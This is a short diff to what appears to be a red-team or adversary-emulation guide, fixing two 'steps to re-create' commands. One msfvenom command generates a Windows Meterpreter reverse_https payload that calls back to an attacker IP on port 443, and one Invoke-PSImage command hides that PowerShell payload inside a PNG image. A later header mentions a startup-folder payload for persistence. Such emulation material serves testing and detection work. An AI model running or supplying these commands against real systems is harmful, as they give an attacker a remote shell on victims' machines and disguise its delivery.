@@ -38,7 +38,7 @@ Steps to re-create:
 1. Generate a PowerShell-formatted Meterpreter payload:
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh-cmd -o meterpreter.ps1
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1
 ```
 
 2. Transfer meterpreter.ps1 to Windows attack platform; embed meterpreter.ps1 into a PNG file using Invoke-PSImage (https://github.com/peewpw/Invoke-PSImage):
@@ -48,7 +48,7 @@ Import-Module .\Invoke-PSImage.ps1
 ```
 
 ```
-Invoke-PSImage -Script .\meterpreter.ps1.ps1 -Out .\monkey.png -Image .\monkey.jpg
+Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg
 ```
 
 #### 3. Startup Folder Payload (strings64/hostui.exe)
